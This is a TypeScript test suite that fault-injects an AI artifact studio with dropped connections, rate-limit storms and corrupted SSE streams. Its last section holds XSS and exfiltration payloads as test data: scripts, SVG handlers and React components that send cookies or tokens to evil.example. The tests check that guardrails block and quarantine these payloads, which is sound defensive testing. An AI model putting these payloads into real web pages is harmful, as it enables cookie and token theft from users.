// Chaos and fault injection: dropped sockets, rate-limit storms, corrupted SSE and hostile
// artifacts, injected at the transport, protocol and content layers. Each scenario is
// checked where the fault lands (dispatcher, client, bridge, reducer) and where the user
// sees it (the studio UI, driven through the real /api/chat handler).
import { act, render, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { createElement } from "react";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

import { Studio } from "@/components/studio";
import {
  artifactReducer,
  INITIAL_ARTIFACT_STORE,
  selectArtifact,
} from "@/lib/core/artifact-reducer";
import { consumeEventStream } from "@/lib/core/stream-dispatcher";
import { inspectArtifact, isBlocking } from "@/lib/guardrails/artifact-guardrails";
import { buildCriticFeedback, formatRepairMessage } from "@/lib/guardrails/critic-loop";
import { assessInput } from "@/lib/guardrails/input-guardrails";
import { type ArtifactType, LIMITS, type StreamEvent } from "@/lib/schemas";
import { AgentClientError, createAgentClient, sleep } from "@/lib/tools/agent-client";
import { createMockAgentServer } from "@/lib/tools/mock-agent-provider";
import { bridgeAgentStream, type StudioUIMessageChunk } from "@/lib/tools/stream-bridge";
import {
  chunkedBody,
  DONE_FRAME,
  dropConnection,
  scriptedAgent,
  scriptedReply,
  seededRandom,
  sseFrames,
  trackBodies,
} from "~tests/fixtures/agent";
import { agentRequest, collect } from "~tests/fixtures/chat";
import { routePipeline } from "~tests/fixtures/pipeline";

const chat = () => screen.getByRole("region", { name: "Chat" });
const canvas = () => screen.getByRole("region", { name: "Canvas" });

async function ask(transport: Parameters<typeof Studio>[0]["transport"], prompt: string) {
  const user = userEvent.setup();
  render(createElement(Studio, transport === undefined ? {} : { transport }));
  await user.type(screen.getByRole("textbox", { name: "Message" }), `${prompt}{Enter}`);
  return user;
}

// Any promise rejection nobody handled is a defect, whatever the scenario.
const unhandled: unknown[] = [];
const onUnhandled = (reason: unknown) => unhandled.push(reason);
beforeEach(() => {
  unhandled.length = 0;
  process.on("unhandledRejection", onUnhandled);
});
afterEach(async () => {
  // Let late rejections surface before checking.
  await new Promise((resolve) => setTimeout(resolve, 0));
  process.off("unhandledRejection", onUnhandled);
  expect(unhandled).toEqual([]);
});

/** A turn with one large artifact, streamed in many deltas. */
// 20,000 characters of ordinary source: 400 lines of exactly 50 characters.
const BIG = "export const row = { id: 1, label: 'payload row' };\n"
  .slice(0, 49)
  .concat("\n")
  .repeat(400);
const bigTurn = scriptedReply("msg_big", {
  artifacts: [{ id: "art_big", type: "code", title: "Big file", content: BIG, deltaChars: 1_000 }],
});
const DELTA_10 = '"seq":10,';

describe("chaos — upstream socket dropped mid-delta", () => {
  it("dispatcher: ends as failed/stream_interrupted, keeps what arrived, releases the source", async () => {
    const response = await dropConnection(scriptedAgent([bigTurn]).fetch, DELTA_10)("", {
      body: JSON.stringify(agentRequest),
    });
    const events: StreamEvent[] = [];
    const outcome = await consumeEventStream(response.body as ReadableStream<Uint8Array>, {
      handlers: { onEvent: (event) => void events.push(event) },
    });

    expect(outcome).toMatchObject({
      status: "failed",
      problem: { code: "stream_interrupted", status: 502, retryable: true },
    });
    expect(outcome.cause).toBeInstanceOf(TypeError);
    expect((outcome.cause as TypeError).message).toBe("terminated");
    // Deltas 0..9 made it; the half-delivered frame for seq 10 never became an event.
    const seqs = events.flatMap((e) => (e.type === "artifact-delta" ? [e.seq] : []));
    expect(seqs).toEqual([0, 1, 2, 3, 4, 5, 6, 7, 8, 9]);
    expect(response.bodyUsed).toBe(true);
  });

  it("client + bridge: the UI stream ends with an in-band stream_interrupted problem", async () => {
    const tracked = trackBodies(dropConnection(scriptedAgent([bigTurn]).fetch, DELTA_10));
    const client = createAgentClient({ endpoint: "http://agent.invalid", fetch: tracked.fetch });
    const outcomes: string[] = [];
    const chunks = await collect(
      bridgeAgentStream(await client.stream(agentRequest), {
        onOutcome: (o) => outcomes.push(o.status),
      }),
    );

    const last = chunks.at(-1);
    expect(last?.type).toBe("error");
    expect(
      JSON.parse((last as Extract<StudioUIMessageChunk, { type: "error" }>).errorText),
    ).toMatchObject({
      code: "stream_interrupted",
      title: "Stream interrupted",
    });
    expect(chunks.some((c) => c.type === "finish")).toBe(false);
    expect(outcomes).toEqual(["failed"]);
    expect(tracked.open()).toBe(0);
    expect(tracked.settled.errored).toBe(1);
  });

  it("reducer: the unfinished artifact is marked error, never left streaming", () => {
    const partial = bigTurn.filter(
      (e) => !(e.type === "artifact-delta" && e.seq >= 10) && e.type !== "artifact-close",
    );
    const cut = partial.slice(0, -1); // no finish-message either
    let state = cut.reduce(artifactReducer, INITIAL_ARTIFACT_STORE);
    expect(selectArtifact(state, "art_big")?.state).toBe("streaming");
    state = artifactReducer(state, { type: "stream-aborted" });
    const record = selectArtifact(state, "art_big");
    expect(record).toMatchObject({ state: "error", error: { code: "stream_interrupted" } });
    expect(record?.content).toHaveLength(10_000);
    expect(record?.history).toEqual([]);
  });

  it("UI: reports Stream interrupted, fails the artifact, and recovers on Retry", async () => {
    const tracked = trackBodies(
      dropConnection(scriptedAgent([bigTurn]).fetch, DELTA_10, { times: 1 }),
    );
    const pipeline = routePipeline({ upstream: tracked.fetch });
    const user = await ask(pipeline.transport, "Write a big file");

    const alert = await within(chat()).findByRole("alert");
    expect(alert).toHaveTextContent("Stream interrupted");
    const card = within(chat()).getByRole("button", { name: "Open Big file in canvas" });
    await waitFor(() => expect(within(card).getByText("Failed")).toBeInTheDocument());
    expect(within(canvas()).getByRole("alert")).toHaveTextContent("Stream interrupted");
    expect(screen.queryByLabelText("Generating")).not.toBeInTheDocument();
    expect(pipeline.exchanges).toEqual([{ status: 200, retryAfter: null }]);
    expect(pipeline.outcomes[0]?.status).toBe("failed");

    await user.click(within(alert).getByRole("button", { name: "Retry" }));
    await waitFor(() => expect(within(chat()).queryByRole("alert")).not.toBeInTheDocument());
    await waitFor(() =>
      expect(
        within(within(chat()).getByRole("button", { name: "Open Big file in canvas" })).getByText(
          "Ready",
        ),
      ).toBeInTheDocument(),
    );
    expect(pipeline.outcomes.map((o) => o.status)).toEqual(["failed", "done"]);
    expect(tracked.open()).toBe(0);
  });
});

describe("chaos — upstream 429 storm", () => {
  const backoffEnvelope = (attempt: number, base = 250, max = 4_000) => {
    const ceiling = Math.min(max, base * 2 ** attempt);
    return [ceiling * 0.5, ceiling] as const;
  };

  it("persistent 429 without Retry-After: bounded exponential backoff with jitter", async () => {
    const server = createMockAgentServer({ faults: { httpStatus: 429 } });
    const delays: number[] = [];
    const client = createAgentClient({
      endpoint: "http://agent.invalid",
      fetch: server.fetch,
      maxRetries: 8,
      sleep: async (ms) => void delays.push(ms),
      random: seededRandom(429),
    });

    const error = await client.stream(agentRequest).catch((e: unknown) => e);
    expect(error).toBeInstanceOf(AgentClientError);
    expect((error as AgentClientError).problem).toMatchObject({
      code: "rate_limited",
      status: 429,
    });
    expect(server.stats.requests).toHaveLength(9);
    expect(delays).toHaveLength(8);
    delays.forEach((delay, attempt) => {
      const [low, high] = backoffEnvelope(attempt);
      expect(delay).toBeGreaterThanOrEqual(low);
      expect(delay).toBeLessThanOrEqual(high);
    });
    // Exponential growth until the cap, then flat at the cap (minus jitter).
    expect(Math.max(...delays)).toBeLessThanOrEqual(4_000);
    expect(delays.slice(5).every((d) => d >= 2_000)).toBe(true);
  });

  it("jitter is the full [50%, 100%] band: exact delays for fixed random values", async () => {
    for (const [random, expected] of [
      [0, [125, 250, 500]],
      [0.5, [187.5, 375, 750]],
      [1 - Number.EPSILON, [250, 500, 1_000]],
    ] as const) {
      const delays: number[] = [];
      const client = createAgentClient({
        endpoint: "http://agent.invalid",
        fetch: createMockAgentServer({ faults: { httpStatus: 429 } }).fetch,
        maxRetries: 3,
        sleep: async (ms) => void delays.push(ms),
        random: () => random,
      });
      await expect(client.stream(agentRequest)).rejects.toBeInstanceOf(AgentClientError);
      for (const [i, delay] of delays.entries())
        expect(delay).toBeCloseTo(expected[i] ?? Number.NaN, 6);
    }
  });

  it("de-synchronises a thundering herd of clients", async () => {
    const firstRetry: number[] = [];
    for (let seed = 1; seed <= 50; seed++) {
      const client = createAgentClient({
        endpoint: "http://agent.invalid",
        fetch: createMockAgentServer({ faults: { httpStatus: 429 } }).fetch,
        maxRetries: 1,
        sleep: async (ms) => void firstRetry.push(ms),
        random: seededRandom(seed),
      });
      await expect(client.stream(agentRequest)).rejects.toBeInstanceOf(AgentClientError);
    }
    expect(new Set(firstRetry).size).toBe(50);
  });

  it("honours Retry-After as a floor, and refuses to wait beyond maxRetryAfterMs", async () => {
    const delays: number[] = [];
    const server = createMockAgentServer({
      faults: { httpStatus: 429, retryAfterSeconds: 2, failAttempts: 3 },
    });
    const client = createAgentClient({
      endpoint: "http://agent.invalid",
      fetch: server.fetch,
      maxRetries: 3,
      sleep: async (ms) => void delays.push(ms),
      random: () => 0.5,
    });
    // Recovered storm: three 429s, then the stream.
    const body = await client.stream(agentRequest);
    await body.cancel();
    expect(server.stats.requests).toHaveLength(4);
    expect(delays).toEqual([2_000, 2_000, 2_000]);

    const tooLong = createMockAgentServer({ faults: { httpStatus: 429, retryAfterSeconds: 60 } });
    const impatient = createAgentClient({
      endpoint: "http://agent.invalid",
      fetch: tooLong.fetch,
      maxRetryAfterMs: 10_000,
      sleep: async () => {
        throw new Error("must not wait");
      },
    });
    const error = (await impatient
      .stream(agentRequest)
      .catch((e: unknown) => e)) as AgentClientError;
    expect(error.options.retryAfterMs).toBe(60_000);
    expect(tooLong.stats.requests).toHaveLength(1);
  });

  it("an abort during backoff stops the storm at once", async () => {
    vi.useFakeTimers();
    try {
      const server = createMockAgentServer({ faults: { httpStatus: 429, retryAfterSeconds: 5 } });
      const client = createAgentClient({
        endpoint: "http://agent.invalid",
        fetch: server.fetch,
        sleep,
      });
      const controller = new AbortController();
      const pending = client.stream(agentRequest, { signal: controller.signal });
      const settled = pending.catch((e: unknown) => e);
      await vi.advanceTimersByTimeAsync(1_000);
      controller.abort(new DOMException("user left", "AbortError"));
      expect(((await settled) as DOMException).name).toBe("AbortError");
      await vi.advanceTimersByTimeAsync(60_000);
      expect(server.stats.requests).toHaveLength(1);
      expect(vi.getTimerCount()).toBe(0);
    } finally {
      vi.useRealTimers();
    }
  });

  it("UI: a persistent storm shows a retryable 429; Retry recovers once the storm passes", async () => {
    // Attempts 1-3 (first exchange) and 4 fail; attempt 5 succeeds inside the retried exchange.
    const server = createMockAgentServer({
      toolSteps: 0,
      faults: { httpStatus: 429, retryAfterSeconds: 1, failAttempts: 4 },
    });
    const pipeline = routePipeline({ upstream: server.fetch, client: { maxRetries: 2 } });
    const user = await ask(pipeline.transport, "hello there");

    const alert = await within(chat()).findByRole("alert");
    expect(alert).toHaveTextContent("Too many requests");
    expect(alert).toHaveTextContent("Agent backend responded 429");
    expect(pipeline.exchanges).toEqual([{ status: 429, retryAfter: "1" }]);
    expect(pipeline.delays).toEqual([1_000, 1_000]);
    expect(server.stats.requests).toHaveLength(3);

    await user.click(within(alert).getByRole("button", { name: "Retry" }));
    await waitFor(() =>
      expect(within(chat()).getByRole("article", { name: "Assistant" })).toHaveTextContent(
        /Done\.$/,
      ),
    );
    expect(within(chat()).queryByRole("alert")).not.toBeInTheDocument();
    expect(pipeline.exchanges).toEqual([
      { status: 429, retryAfter: "1" },
      { status: 200, retryAfter: null },
    ]);
    expect(pipeline.delays).toEqual([1_000, 1_000, 1_000]);
    expect(server.stats.requests).toHaveLength(5);
  });
});

describe("chaos — malformed SSE injection", () => {
  const good = scriptedReply("msg_ok", {
    text: "Hello",
    artifacts: [{ id: "art_ok", type: "markdown", title: "Notes", content: "# Héllo 👋 wörld" }],
  });
  const goodFrames = sseFrames(good).slice(0, -1);
  const TRUNCATED_JSON = 'event: text-delta\ndata: {"type":"text-delta","messageId":\n\n';
  const GARBAGE_BYTES = new Uint8Array([0xff, 0xfe, 0x00, 0x9f, 0x92, 0x96, 0x0a, 0x0a]);
  const DATA_GARBAGE = "data: \u0000ÿþ not json at all\n\n";
  const MISMATCHED = `event: artifact-open\ndata: ${JSON.stringify({
    type: "text-delta",
    messageId: "msg_ok",
    delta: "imposter",
  })}\n\n`;
  const UNKNOWN_TYPE = 'event: telemetry\ndata: {"type":"telemetry","cpu":0.5}\n\n';
  const BAD_SHAPE = `event: artifact-delta\ndata: ${JSON.stringify({
    type: "artifact-delta",
    messageId: "msg_ok",
    artifactId: "art_ok",
    revision: 1,
    seq: -1,
    delta: "x",
  })}\n\n`;

  async function run(chunks: (string | Uint8Array)[], maxFrameChars?: number) {
    const events: StreamEvent[] = [];
    const errors: string[] = [];
    const outcome = await consumeEventStream(chunkedBody(chunks), {
      ...(maxFrameChars === undefined ? {} : { maxFrameChars }),
      handlers: {
        onEvent: (event) => void events.push(event),
        onParseError: (error) => void errors.push(error.code),
      },
    });
    return { outcome, events, errors };
  }

  it("skips every kind of corrupt frame and delivers all valid events in order", async () => {
    const corrupt = [
      TRUNCATED_JSON,
      GARBAGE_BYTES,
      DATA_GARBAGE,
      MISMATCHED,
      UNKNOWN_TYPE,
      BAD_SHAPE,
    ];
    const chunks: (string | Uint8Array)[] = [];
    goodFrames.forEach((frame, i) => {
      chunks.push(frame);
      const junk = corrupt[i % corrupt.length];
      if (junk !== undefined) chunks.push(junk);
    });
    chunks.push(DONE_FRAME);

    const { outcome, events, errors } = await run(chunks);
    expect(outcome.status).toBe("done");
    expect(events).toEqual(good);
    // Raw bytes without a data field are inert (no event, no error); the rest are rejected.
    expect(new Set(errors)).toEqual(new Set(["invalid-json", "event-mismatch", "invalid-event"]));
    expect(outcome.parseErrors).toBe(errors.length);
  });

  it("reassembles frames split at every byte, including inside multi-byte characters", async () => {
    const bytes = new TextEncoder().encode([...goodFrames, DONE_FRAME].join(""));
    const singles = [...bytes].map((b) => new Uint8Array([b]));
    const { outcome, events } = await run(singles);
    expect(outcome.status).toBe("done");
    expect(events).toEqual(good);
  });

  it("accepts CRLF and CR line endings", async () => {
    const crlf = goodFrames.map((f) => f.replaceAll("\n", "\r\n"));
    const cr = goodFrames.map((f) => f.replaceAll("\n", "\r"));
    expect((await run([...crlf, DONE_FRAME])).events).toEqual(good);
    expect((await run([...cr, DONE_FRAME])).events).toEqual(good);
  });

  it("drops an oversized frame without buffering it, then carries on", async () => {
    const huge = `data: ${"x".repeat(5_000)}\n\n`;
    const { outcome, events, errors } = await run([huge, ...goodFrames, DONE_FRAME], 1_000);
    expect(errors).toEqual(["too-large"]);
    expect(events).toEqual(good);
    expect(outcome.status).toBe("done");
  });

  it("survives seeded random garbage at random split points (200 schedules)", async () => {
    for (let seed = 1; seed <= 200; seed++) {
      const random = seededRandom(seed);
      const stream: Uint8Array[] = [];
      const encoder = new TextEncoder();
      for (const frame of goodFrames) {
        if (random() < 0.5) {
          const junk = Uint8Array.from({ length: 1 + Math.floor(random() * 40) }, () =>
            Math.floor(random() * 256),
          );
          stream.push(junk, encoder.encode("\n\n"));
        }
        stream.push(encoder.encode(frame));
      }
      stream.push(encoder.encode(DONE_FRAME));
      // Re-split the whole byte sequence at random points.
      const all = new Uint8Array(stream.reduce((n, c) => n + c.byteLength, 0));
      let offset = 0;
      for (const chunk of stream) {
        all.set(chunk, offset);
        offset += chunk.byteLength;
      }
      const chunks: Uint8Array[] = [];
      for (let at = 0; at < all.length; ) {
        const size = 1 + Math.floor(random() * 64);
        chunks.push(all.slice(at, at + size));
        at += size;
      }
      const { outcome, events } = await run(chunks);
      expect(outcome.status, `seed ${seed}`).toBe("done");
      expect(events, `seed ${seed}`).toEqual(good);
    }
  });

  it("gives up after too many consecutive bad frames, and cancels the source", async () => {
    let cancelled = false;
    const source = new ReadableStream<string>({
      pull(controller) {
        controller.enqueue(TRUNCATED_JSON);
      },
      cancel() {
        cancelled = true;
      },
    });
    const outcome = await consumeEventStream(source);
    expect(outcome).toMatchObject({
      status: "failed",
      parseErrors: LIMITS.consecutiveParseErrors,
      problem: { code: "invalid_frame" },
    });
    expect(cancelled).toBe(true);
  });

  it("UI: a corrupted upstream still completes the turn cleanly", async () => {
    // Garbage between every frame the mock agent sends, plus one malformed JSON frame.
    const server = createMockAgentServer({ toolSteps: 1, faults: { malformedFrameAfter: 3 } });
    const junkUpstream = (async (input: RequestInfo | URL, init?: RequestInit) => {
      const response = await server.fetch(input, init);
      const reader = (response.body as ReadableStream<Uint8Array>).getReader();
      let flip = false;
      const body = new ReadableStream<Uint8Array>(
        {
          async pull(controller) {
            flip = !flip;
            if (flip) {
              controller.enqueue(new TextEncoder().encode(": keep-alive\n\n"));
              controller.enqueue(GARBAGE_BYTES);
              return;
            }
            const { done, value } = await reader.read();
            if (done) controller.close();
            else controller.enqueue(value);
          },
          cancel: (reason) => reader.cancel(reason),
        },
        { highWaterMark: 0 },
      );
      return new Response(body, { headers: response.headers });
    }) as typeof fetch;

    const pipeline = routePipeline({ upstream: junkUpstream });
    await ask(pipeline.transport, "Draw a mermaid flow chart");
    const card = await within(chat()).findByRole("button", { name: "Open Request flow in canvas" });
    await waitFor(() => expect(within(card).getByText("Ready")).toBeInTheDocument());
    await waitFor(() =>
      expect(within(chat()).getByRole("article", { name: "Assistant" })).toHaveTextContent(
        "All artifacts are ready.",
      ),
    );
    expect(within(chat()).queryByRole("alert")).not.toBeInTheDocument();
    expect(pipeline.outcomes[0]).toMatchObject({ status: "done", parseErrors: 1 });
    expect(pipeline.outcomes[0]?.heartbeats).toBeGreaterThan(10);
  });
});

describe("chaos — adversarial artifact injection", () => {
  const PAYLOADS: [string, ArtifactType, string][] = [
    [
      "script exfiltrating cookies",
      "html",
      '<p>hi</p><script>fetch("https://evil.example/c?" + document.cookie)</script>',
    ],
    ["image onerror handler", "html", '<img src="x" onerror="location=\'https://evil.example\'">'],
    ["javascript: link", "html", '<a href="javascript:alert(document.domain)">click</a>'],
    [
      "script breakout in a string",
      "html",
      '<script>const s = "</script><script>alert(1)</script>";</script>',
    ],
    [
      "form posting off-site",
      "html",
      '<form action="https://evil.example/steal"><input name="pw"></form>',
    ],
    [
      "meta refresh redirect",
      "html",
      '<meta http-equiv="refresh" content="0;url=https://evil.example">',
    ],
    ["embedded frame", "html", '<iframe src="https://evil.example"></iframe>'],
    [
      "svg onload",
      "svg",
      '<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(\'//evil.example\')"></svg>',
    ],
    [
      "react cookie theft",
      "react",
      `export default function A() {\n  new Image().src = \`https://evil.example/?c=\${document.cookie}\`;\n  return <p />;\n}`,
    ],
    [
      "react frame escape",
      "react",
      'export default function A() {\n  window.parent.postMessage(localStorage.getItem("token"), "*");\n  return <p />;\n}',
    ],
    [
      "react eval",
      "react",
      'export default function A() {\n  eval("alert(1)");\n  return <p />;\n}',
    ],
    [
      "react sendBeacon",
      "react",
      'export default function A() {\n  navigator.sendBeacon("https://evil.example", "x");\n  return <p />;\n}',
    ],
    [
      "react runaway loop",
      "react",
      "export default function A() {\n  while (true) {}\n  return <p />;\n}",
    ],
  ];

  it.each(PAYLOADS)("blocks %s", async (_name, type, content) => {
    const language = type === "react" ? "tsx" : type;
    const inspection = await inspectArtifact({ type, language, content });
    expect(inspection.passed).toBe(false);
    expect(inspection.defects.some(isBlocking)).toBe(true);

    // The critic can always describe it, and the repair request is itself sendable.
    const feedback = buildCriticFeedback(
      { id: "art_x", revision: 1, title: "Hostile", type, language },
      inspection,
      1,
    );
    expect(feedback).not.toBeNull();
    if (feedback !== null) expect(assessInput(formatRepairMessage(feedback)).allowed).toBe(true);
  });

  it("UI: quarantines the XSS artifact, never runs it, and the critic loop stops after 2", async () => {
    const xss = {
      title: "Hostile page",
      language: "html",
      content:
        '<!doctype html>\n<html><body>\n<h1>Welcome</h1>\n<script>fetch("https://evil.example/c?" + document.cookie)</script>\n</body></html>',
    };
    const server = createMockAgentServer({
      toolSteps: 0,
      artifactTypes: ["html"],
      artifacts: { html: xss },
    });
    const pipeline = routePipeline({ upstream: server.fetch });
    await ask(pipeline.transport, "Make an HTML landing page");

    // Turn 1 plus exactly two automatic repair requests, all accepted by /api/chat.
    await waitFor(() => expect(server.stats.requests).toHaveLength(3), { timeout: 5_000 });
    await waitFor(() => expect(within(chat()).getAllByText("Failed")).toHaveLength(3));
    await act(async () => new Promise((resolve) => setTimeout(resolve, 100)));
    expect(server.stats.requests).toHaveLength(3);
    expect(pipeline.exchanges.map((e) => e.status)).toEqual([200, 200, 200]);

    const repairs = server.stats.requests.slice(1).map((r) => r.messages.at(-1)?.content ?? "");
    expect(repairs[0]).toMatch(/^\[Artifact repair request 1\/2\]/);
    expect(repairs[1]).toMatch(/^\[Artifact repair request 2\/2\]/);
    expect(repairs[0]).toContain("network-sink");

    const alert = within(canvas()).getByRole("alert");
    expect(alert).toHaveTextContent("Artifact rejected by security inspection");
    // The payload never reached a document: no frame was ever mounted.
    expect(document.querySelector("iframe")).toBeNull();
  }, 20_000);
});
